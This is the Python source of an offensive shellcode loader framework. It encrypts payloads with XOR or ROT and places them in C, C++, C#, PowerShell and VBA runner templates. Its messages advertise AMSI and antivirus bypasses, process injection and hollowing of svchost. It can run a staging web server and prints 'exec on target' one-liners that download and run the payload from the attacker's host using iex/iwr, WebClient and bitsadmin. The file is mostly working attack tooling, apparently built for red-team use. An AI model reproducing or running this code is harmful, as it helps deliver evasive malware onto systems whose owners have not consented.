import argparse
import sys
import itertools
import random
import string
from base64 import b64encode
from colorama import Fore, Style
from random import choice
import http.server
import socketserver

# func: banner
def banner():
    print("   ___            _                                ") 
    print("  / __\ __ _ _ __| |__   __ _  ___ __ _ _ __   ___ ") 
    print(" /__\/// _` | '__| '_ \ / _` |/ __/ _` | '_ \ / _ \ ") 
    print("/ \/  \ (_| | |  | |_) | (_| | (_| (_| | | | |  __/") 
    print("\_____/\__,_|_|  |_.__/ \__,_|\___\__,_|_| |_|\___|") 
    print("+ VBA/Powershell/C/++/# Shellcode loader framework +")
    print()

#func: moto
def moto():
    strings = ['Every plague doctor gains +10 stealth  ','Every grave robber gains +30 dodge','Every highwayman gains +20 agility','Every bounty hunter gains +15 charisma']
    print("+ -- [ " + choice(strings) + " ] -- +")

# func: read content from a file
def write_from_file(filename):
    with open(filename, 'r') as file:
        content = file.read()
        return content

# func: write content to a file
def write_to_file(filename, content):
    with open(filename, 'w') as file:
        file.write(content)

# func: base64 encode a content for Powershell
def encode_base64(ps):
    return b64encode(ps.encode('UTF-16LE'))

# func: setting up an HTTP listener
def http_server(lhost, lport,wwwroot):
    class Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory=wwwroot, **kwargs)
    with socketserver.TCPServer((lhost, lport), Handler) as httpd:
        print(Fore.YELLOW + "[*]" + Fore.WHITE +" HTTP server serving at: http://" + lhost +":" + str(lport))
        httpd.serve_forever()

# func: XOR cypher
def xor_cypher(input_string, key):
    return bytes(a ^ b for a, b in zip(input_string, itertools.cycle(key)))

# func: XOR payload for C++
def xor_encrypt(binary_file,key):
    #print (Fore.YELLOW + "[*]" + Fore.WHITE +"Remember use the python format as payload (msfvenom -f python)")
    with open(binary_file, 'rb') as f:
        binary_data = f.read()
    encrypted_data = xor_cypher(binary_data, key.encode())
    output = ', '.join(f'0x{byte:02x}' for byte in encrypted_data)
    xor_pld = f'unsigned char payload[] = {{ {output} }};'
    return xor_pld

# func: ROT2 payload for C#
def caesar_encrypt(binary_file):
    with open(binary_file, 'rb') as f:
        binary_data = f.read()
    encoded = [(byte + 2) & 0xFF for byte in binary_data]
    hex_encoded = [f"0x{byte:02x}" for byte in encoded]
    rot_pld = f"byte[] buf = new byte[{len(binary_data)}] {{{', '.join(hex_encoded)}}}"
    return rot_pld

# func: Formating payload for ps1 template
def formating_ps1(binary_file):
    with open(binary_file, 'rb') as f:
        binary_data = f.read()
    hex_rep = ', '.join(f'0x{byte:02x}' for byte in binary_data)
    output = f"[Byte[]] $buf = {hex_rep}"
    return output

#func: ROT17 of the hex representation of cmd 
def vba_wmi_obfs(cmd):
    output = ""
    for char in cmd:
        rot = ord(char) + 17  # Convert char to ASCII and add 17
        # Format the number with leading zeros to ensure it's at least 3 digits
        rot = f"{rot:03}"
        output += rot
    return output

# func: ROT2 payload for VBA
def vba_caesar_encrypt(binary_file):
    with open(binary_file, 'rb') as f:
        binary_data = f.read()
    encoded = [(byte + 2) & 0xFF for byte in binary_data]
    counter = 0
    # Build the VBA formatted string
    vba_formatted = []
    # Iterate through each byte in the encoded list
    for i, byte in enumerate(encoded):
        # For the first byte and after every 50th byte, append without leading comma
        if i % 50 == 0:
            if i != 0:  # If not the first byte, append line break before the next byte
                vba_formatted.append(", _\n")
            vba_formatted.append(f"{byte}")
        else:
            vba_formatted.append(f", {byte}")
    # Join the formatted bytes with commas and handle the trailing line break if needed
    vba_string = "".join(vba_formatted).rstrip("_\n")
    return vba_string

# func: XOR payload for C
def xor_encrypt_c(binary_file,key):
    with open(binary_file, 'rb') as f:
        binary_data = f.read()
    encrypted_data = xor_cypher(binary_data, key.encode())
    output = ', '.join(f'0x{byte:02x}' for byte in encrypted_data)
    xor_pld = f'unsigned char payload[] = {{ {output} }};'
    return xor_pld

# func: create a template for shellcode runner in C for linux
def create_c_runner(binary_file,key, filename):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a c Linux shellcode runner (XOR encrypted)")
    print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom c template generated")
    runner = write_from_file("template/c/shellcode_runner.c")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found at " + binary_file)
    payload = xor_encrypt_c(binary_file,key)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload XOR encrypted")
    runner = runner.replace("<PAYLOAD>", payload)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    runner = runner.replace("<KEY>", key)
    template_file = "output/" + filename + ".c"
    output_file = "output/" + filename
    write_to_file(output_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + template_file)
    return output_file, template_file

# func: create a template for shellcode runner in C++
def create_cpp_runner(binary_file,key, filename, dll):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a c++ Windows shellcode runner (IAT obfuscation, prime-number bypass, adding strings to reduce level of entropy)")
    if dll is True:
        print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom c++ template for DLL generated")
        runner = write_from_file("template/cpp/shellcode_runner_dll.cpp")
    else:
        print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom c++ template for PE generated")
        runner = write_from_file("template/cpp/shellcode_runner.cpp")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found at " + binary_file)
    payload = xor_encrypt(binary_file,key)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload XOR encrypted")
    runner = runner.replace("<PAYLOAD>", payload)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    runner = runner.replace("<KEY>", key)
    template_file = "output/" + filename + ".cpp"
    if dll is True:
        output_file = "output/" + filename + ".dll"
    else:
        output_file = "output/" + filename + ".exe"
    write_to_file(template_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + template_file)
    return output_file, template_file

# func: create a template for shellcode runner in C#
def create_csharp_runner(binary_file, filename, dll):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a c# Windows shellcode runner (Caesar cypher encryption, dynamic AV bypasses with non-emulated API and sleep-based bypass)")
    if dll is True:
        print (Fore.RED + "[*]" + Fore.WHITE +" Unmanaged feature")
        exit(0)
    else:
        print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom c# template for PE generated")
        runner = write_from_file("template/c#/shellcode_runner.cs")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found at " + binary_file)
    payload = caesar_encrypt(binary_file)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload ROT2 encrypted")
    runner = runner.replace("<PAYLOAD>", payload)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    template_file = "output/" + filename + ".cs"
    output_file = "output/" + filename + ".exe"
    write_to_file(template_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + template_file)
    return output_file, template_file

# func: create a template for shellcode runner in Powershell
def create_power_runner(powershell_pld, filename):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a Powershell Windows shellcode runner (AMSI bypass)")
    #print (Fore.YELLOW + "[*]" + Fore.WHITE +" Remember the payload must be generated in a Powershell compatible format")
    print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom Powershell template generated")
    #rand_name = "".join(random.choice(string.ascii_letters) for i in range(8))
    runner = write_from_file("template/powershell/shellcode_runner.ps1")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found at " + powershell_pld)
    pld = formating_ps1(powershell_pld)
    runner = runner.replace("<PAYLOAD>",pld)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    output_file = "output/" + filename + ".ps1"
    write_to_file(output_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + output_file)
    return output_file

# func: create a template for shellcode loader in VBA
def create_vba_loader(vba_pld, filename):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a VBA shellcode loader (Caesar cypher encryption, sleep-based bypass)")
    print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom VBA template generated")
    runner = write_from_file("template/vba/shellcode_loader.vba")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found at " + vba_pld)
    payload = vba_caesar_encrypt(vba_pld)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload ROT2 encrypted")
    runner = runner.replace("<PAYLOAD>", payload)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    template_file = "output/" + filename + ".vba"
    write_to_file(template_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + template_file)

# func: create a template for a VBA abusing WMI to get code execution
def create_vba_wmi(vba_pld, filename):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a VBA runner abusing WMI (Caesar cypher encryption, string obfuscation)")
    print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom VBA template generated")
    runner = write_from_file("template/vba/shellcode_wmi.vba")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found: " + vba_pld)
    payload = vba_wmi_obfs(vba_pld)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload ROT17 encrypted")
    runner = runner.replace("<PAYLOAD>", payload)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    template_file = "output/" + filename + ".vba"
    write_to_file(template_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + template_file)

# func: create a template for shellcode injector in C#
def create_csharp_injector(binary_file, pid, filename, dll):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a c# Windows shellcode process injector (Caesar cypher encryption, dynamic AV bypasses with non-emulated API and sleep-based bypass)")
    if dll is True:
        print (Fore.RED + "[*]" + Fore.WHITE +" Unmanaged feature")
        exit(0)
    else:
        print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom c# template for PE generated")
        runner = write_from_file("template/c#/shellcode_injector.cs")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found at " + binary_file)
    payload = caesar_encrypt(binary_file)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload ROT2 encrypted")
    runner = runner.replace("<PAYLOAD>", payload)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    runner = runner.replace("<PID>", pid)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Template configured to inject payload into "+ pid)
    template_file = "output/" + filename + ".cs"
    output_file = "output/" + filename + ".exe"
    write_to_file(template_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + template_file)
    return output_file, template_file

# func: create a template for shellcode hollower in C#
def create_csharp_hollow(binary_file, hol, filename, dll):
    print (Fore.YELLOW + "[*]" + Fore.WHITE +" Creating a c# Windows shellcode hollower (Caesar cypher encryption, dynamic AV bypasses with non-emulated API and sleep-based bypass)")
    if dll is True:
        print (Fore.RED + "[*]" + Fore.WHITE +" Unmanaged feature")
        exit(0)
    else:
        print (Fore.BLUE + "[+]" + Fore.WHITE +" Custom c# template for PE generated")
        runner = write_from_file("template/c#/shellcode_hollow.cs")
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload found at " + binary_file)
    payload = caesar_encrypt(binary_file)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload ROT2 encrypted")
    runner = runner.replace("<PAYLOAD>", payload)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Payload nested")
    runner = runner.replace("<HOLLOW>", hol)
    print(Fore.BLUE + "[+]" + Fore.WHITE +" Template configured to inject payload into "+ hol)
    template_file = "output/" + filename + ".cs"
    output_file = "output/" + filename + ".exe"
    write_to_file(template_file, runner)
    print(Fore.GREEN + "[+]" + Fore.WHITE +" The template is available at " + template_file)
    return output_file, template_file

if __name__ == '__main__':
    nkey = "z"
    wkey = "secretkey"
    banner()
    moto()
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument("-format", action="store", help="choose the language (VBA/shellcode, VBA/wmi, C#, C++, Powershell, C for linux)", type=str, required=True)
        parser.add_argument("--dll", action="store_true", help="when choosing C++, you can specify if you want a DLL instead of a PE", default=False)
        parser.add_argument("--staging", action="store_true", help="run a web server for staging purpose", default=False)
        parser.add_argument("-host", action="store", help="declare the local host", type=str)
        parser.add_argument("-port", action="store", help="declare the local port", type=int)
        parser.add_argument("-name", action="store", help="declare the payload's filename", type=str, required=True)
        parser.add_argument("-pld", action="store", help="choose the raw payload to nest", type=str, default="payload/pld.bin")
        parser.add_argument("--inject", action="store_true", help="create an injector instead of a runner (only work with C#)", default=False)
        parser.add_argument("-mode", action="store", help="when using --inject, choose the mode of injection (inject or hollow)", type=str, required=False)
        parser.add_argument("-pid", action="store", help="declare the process that will be tampered (by default explorer)", type=str, default="explorer")
        parser.add_argument("-hol", action="store", help="declare the process you want to hollow (by default C:\\\Windows\\\System32\\\svchost.exe)", type=str, default="C:\\\Windows\\\System32\\\svchost.exe")
        args = parser.parse_args() # Declare arguments object to args
        if args.pld == "payload/pld.bin":
            print (Fore.YELLOW + "[*]" + Fore.WHITE +" WARNING: you are using a x64 Windows test payload for debugging purpose")
        if args.inject == False:
            if args.format == "C++":
                output_file, template_file = create_cpp_runner(args.pld, wkey, args.name, args.dll)
                if args.dll is True:
                    print(Fore.GREEN + "[+]" + Fore.WHITE +" >>> Compile on Windows VM using x64 VS cli: cl.exe /D_USRDLL /D_WINDLL " + template_file + " /MT /link /DLL /OUT:" + output_file)
                else:
                    print(Fore.GREEN + "[+]" + Fore.WHITE +" >>> Compile on Windows VM using x64 VS cli: cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tc" + template_file + " /link /OUT:" + output_file + " /SUBSYSTEM:CONSOLE /MACHINE:x64")
            elif args.format == "C#":
                output_file, template_file = create_csharp_runner(args.pld, args.name, args.dll)
                print(Fore.GREEN + "[+]" + Fore.WHITE +" Compile on Windows VM using csc.exe /out:"+ output_file +" "+ template_file +" /nologo")
            elif args.format == "C":
                output_file, template_file = create_c_runner(args.pld, nkey, args.name)
                print(Fore.GREEN + "[+]" + Fore.WHITE +" >>> Compile on target using gcc -o " + output_file + " " + template_file + " -z execstack")
            elif args.format == "Powershell":
                output_file = create_power_runner(args.pld, args.name)
            elif args.format == "VBA/shellcode":
                template_file = create_vba_loader(args.pld, args.name)
            elif args.format == "VBA/wmi":
                if args.pld == "payload/pld.bin":
                    args.pld = "powershell -exec bypass -nop -WindowStyle Hidden -c calc.exe"
                template_file = create_vba_wmi(args.pld, args.name)
            else:
                print (Fore.RED + "[*]" + Fore.WHITE +" Unrecognized argument")
                parser.print_help()
                exit(0)
        elif args.inject == True:
            if args.format == "C#":
                if args.mode == "inject":
                    output_file, template_file = create_csharp_injector(args.pld, args.pid, args.name, args.dll)
                    print(Fore.GREEN + "[+]" + Fore.WHITE +" Compile on Windows VM using csc.exe /out:"+ output_file +" "+ template_file +" /nologo")
                elif args.mode == "hollow":
                    output_file, template_file = create_csharp_hollow(args.pld, args.hol, args.name, args.dll)
                    print(Fore.GREEN + "[+]" + Fore.WHITE +" Compile on Windows VM using csc.exe /out:"+ output_file +" "+ template_file +" /nologo")
                else:
                    print (Fore.RED + "[*]" + Fore.WHITE +" -mode argument is missing. Choose -mode inject or -mode hollow") 
            else:
                print (Fore.RED + "[*]" + Fore.WHITE +"Unsupported option for now :/")
        else:
            print (Fore.RED + "[*]" + Fore.WHITE +" Unrecognized argument")
            parser.print_help()
        if args.port and args.host:
            if args.format != "vba/wmi" or args.format != "vba/shellcode":
                if args.dll is True:
                    print(Fore.BLUE + "[+]" + Fore.WHITE +" Exec on target:")
                    print(" >>> powershell -ep bypass -nop -c (New-Object System.Net.WebClient).DownloadFile(http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll, " + args.name + ".dll")
                    print(" >>> powershell -ep bypass -nop -c Invoke-WebRequest -Uri http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll -OutFile " + args.name + ".dll")
                    print(" >>> bitsadmin /transfer pwn /download http://" + args.host + ":" + str(args.port) + "/" + args.name + ".dll " + args.name + ".dll")
                elif args.format == "Powershell":
                    print(Fore.GREEN + "[+]" + Fore.WHITE +" >>> Exec on target: powershell -ep bypass -nop -c iex (iwr http://" + args.host + ":" + str(args.port) + "/" + output_file +" -UseBasicParsing)")
                else:
                    print(Fore.BLUE + "[+]" + Fore.WHITE +" Exec on target:")
                    print(" >>> powershell -ep bypass -nop -c (New-Object System.Net.WebClient).DownloadFile('http://" + args.host + ":" + str(args.port) + "/" + args.name + ".exe', '" + args.name + ".exe')")
                    print(" >>> powershell -ep bypass -nop -c Invoke-WebRequest -Uri http://" + args.host + ":" + str(args.port) + "/" + args.name + ".exe -OutFile " + args.name + ".exe")
                    print(" >>> bitsadmin /transfer pwn /download http://" + args.host + ":" + str(args.port) + "/" + args.name + ".exe " + args.name + ".exe")
                if args.staging is True:
                    http_server(args.host, args.port, ".")
    except KeyboardInterrupt:
        quit_message  = input("\n" + Fore.BLUE + "[+]" + Fore.WHITE +"Confirm you really want to quit (y/n)\n")
        if quit_message == "y":
            print(Fore.BLUE + "[+]" + Fore.WHITE +" Exiting now!")
            exit(0)
    except Exception as e:
        print(Fore.RED + "[!]" + Fore.WHITE + " An error occurred: " + str(e))    
                
